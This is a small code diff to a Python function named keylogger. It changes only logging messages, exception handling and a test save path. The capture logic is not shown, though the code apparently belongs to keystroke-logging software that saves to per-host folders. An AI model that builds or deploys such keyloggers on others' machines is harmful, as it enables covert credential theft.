@@ -153,9 +153,10 @@ def keylogger(save_dir, isEndFlag):
     except KeyboardInterrupt:
         logging.debug('catch Ctrl+C in {}'.format(__name__))
     except Exception as e:
-        logging.error('Error: {}'.format(e.args))
+        logging.error('Unknown Error: {}'.format(e.args))
+        pass
     
-    logging.info('Keylogger out')
+    logging.debug('Keylogger out')
     return None
 
 if __name__ == '__main__':
@@ -169,4 +170,4 @@ if __name__ == '__main__':
                 continue
             print(keys[code])
     """
-    keylogger(['D:\\Tmp\\SaveFiles\\127.0.0.1\\logger'])
+    keylogger(['D:\\Tmp\\SaveFiles\\test_logger'])
